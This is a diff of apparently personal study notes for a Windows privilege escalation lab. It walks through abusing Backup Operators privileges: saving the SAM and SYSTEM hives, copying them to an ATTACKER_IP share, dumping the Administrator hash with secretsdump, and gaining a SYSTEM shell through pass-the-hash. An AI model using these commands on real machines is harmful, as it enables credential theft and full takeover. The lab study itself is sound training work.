@@ -478,14 +478,14 @@ nt authority\system
   * Ignores any DACL in place.
 * Rationale is to allow certain users to perform backups without requiring full admin rights.
 * Attacker can trivially escalate privileges with these privileges.
-* Copy SAM and SYSTEM registry hives to extract Administrator's password hash example.
-1. RDP to target.
+### Copy SAM and SYSTEM registry hives to extract Administrator's password hash example.
+#### 1. RDP to target.
 ```
 xfreerdp /u:THMBackup /p:CopyMaster555 /v:10.10.21.86
 ```
 * "THMBackup" is member of "Backup Operators" group.
   * Granted SeBackup and SeRestore privileges.
-2. Open command prompt using "Open as administrator" to use the elevated privileges.
+#### 2. Open command prompt using "Open as administrator" to use the elevated privileges.
 * Check account's privileges.
 ```
 whoami /priv
@@ -501,12 +501,12 @@ SeShutdownPrivilege           Shut down the system           Disabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 ```
-3. Backup SAM and SYSTEM hashes.
+#### 3. Backup SAM and SYSTEM hashes.
 ```
 reg save hklm\system C:\Users\THMBackup\system.hive
 reg save hklm\sam C:\Users\THMBackup\sam.hive
 ```
-4. Copy files to attacker machine.
+#### 4. Copy files to attacker machine.
 * Use impacket's `smbserver.py` to start SMB server with a network share.
 ```
 mkdir share
@@ -519,7 +519,7 @@ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -
 copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
 copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
 ```
-5. Use impacket to retrieve users' password hashes.
+#### 5. Use impacket to retrieve users' password hashes.
 ```
 python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
 Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
@@ -528,7 +528,7 @@ Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corpo
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::
 ```
-* Perform Pass-the-Hash attack to gain access to target with SYSTEM privileges.
+#### 6. Perform Pass-the-Hash attack to gain access to target with SYSTEM privileges.
 ```
 python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.21.86
 Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
@@ -545,8 +545,11 @@ Microsoft Windows [Version 10.0.17763.1821]
 C:\Windows\system32> whoami
 nt authority\system
 ```
-## SeTakeOwnership
-
+## SeTakeOwnership Privilege
+* Allows user to take ownership of any object on a system.
+* Opens up many possibilities for an attacker to elevate privileges.
+  * E.g. Take ownership of a service's executable that is running as SYSTEM.
+* 
 ## SeImpersonate / SeAssignPrimaryToken
 
 # Abusing Vulnerable Software
